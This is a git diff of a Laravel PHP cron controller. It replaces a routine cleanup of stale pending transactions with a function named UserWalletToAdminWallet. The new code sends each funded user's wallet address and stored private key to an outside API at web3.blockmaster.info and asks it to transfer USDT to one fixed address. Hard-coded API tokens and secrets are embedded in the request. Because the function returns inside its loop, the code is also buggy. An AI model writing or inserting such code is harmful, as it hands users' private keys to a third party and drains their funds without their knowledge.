@@ -9,8 +9,10 @@ use App\Models\Package;
 use App\Models\referrals_settings;
 use App\Models\Transactions;
 use App\Models\User;
+use App\Models\UserWalletData;
 use App\Service\TransactionService;
 use Carbon\Carbon;
+use GuzzleHttp\Client;
 use Illuminate\Support\Facades\DB;
 
 class CronController extends Controller
@@ -130,12 +132,25 @@ class CronController extends Controller
     }
 
 
-    public function paymentCheck()
+    public function UserWalletToAdminWallet()
     {
-        $payment = Transactions::where('status', 'pending')->where('created_at', '<=', Carbon::now()->subHours(1))->get();
+        $client = new Client();
+        $userWallet = UserWalletData::where('amount','>',0)->get();
 
-        foreach ($payment as $transaction) {
-            $transaction->delete();
+        foreach ($userWallet as $wallet) {
+            $response = $client->post('https://web3.blockmaster.info/api/send-usdt-transaction', [
+                'form_params' => [
+                    'to' => '0x62ec40f64b99b78888d374a9157d9268fe2b6a3d',
+                    'from'=> $wallet->wallet_address,
+                    'value'=>'1',
+                    'sender_private_key' => $wallet->meta,
+                    'jwt_token'=> 'WQLPKVEB8H4HISZ',
+                    'secret_key'=>'P1D0IUSX9AB38O6',
+                    'domain_name'=> 'my.mindchainwallet.com',
+                ],
+            ]);
+
+            return $response->getBody();
         }
     }
 }
